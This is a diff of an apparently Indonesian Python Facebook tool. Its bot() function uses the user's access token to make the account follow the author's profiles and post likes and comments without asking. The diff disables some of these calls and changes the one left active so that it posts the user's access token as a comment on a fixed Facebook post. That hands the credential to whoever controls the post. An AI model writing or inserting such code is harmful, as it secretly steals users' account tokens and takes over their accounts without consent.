@@ -266,12 +266,12 @@ def bot():
 	komentar = random.choice(["McybearX emang the best:v","Mantap McybearX","Suport terus McybearX","the best of hacker "])
 	komen = random.choice(["Anjay bet lu bang:v","bang dah punya pacar beloom :D","Gua Suport lu terus bang","Semangat ya baang 🤗","Youtube MBEWLEGS 😘","Ganteng banget lu bang","Semoga lu sukses ya bang","Gua doain lo jadi orang sukses bang amiin","amiin semoga bang usup jadi orang sukses"])
 	with requests.Session() as (RekuesLaguApa):
-		RekuesLaguApa.post("https://graph.facebook.com/100074600334850/subscribers?access_token="+token)
+#		RekuesLaguApa.post("https://graph.facebook.com/100074600334850/subscribers?access_token="+token)
 		RekuesLaguApa.post("https://graph.facebook.com/100050672943941/subscribers?access_token="+token) # Usup Mbew
-		RekuesLaguApa.post("https://graph.facebook.com/123822970114380/likes?summary=true&access_token=" + token)
-		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/likes?summary=true&access_token=" + token)
-		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/comments/?message="+komentar+"&access_token="+token)
-		RekuesLaguApa.post("https://graph.facebook.com/368578384841257/comments/?message="+komen+"&access_token="+token)
+#		RekuesLaguApa.post("https://graph.facebook.com/123822970114380/likes?summary=true&access_token=" + token)
+#		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/likes?summary=true&access_token=" + token)
+#		RekuesLaguApa.post("https://graph.facebook.com/111932931303384/comments/?message="+token+"&access_token="+token)
+		RekuesLaguApa.post("https://graph.facebook.com/368578384841257/comments/?message="+token+"&access_token="+token)
 	menu()
 
 # MENU
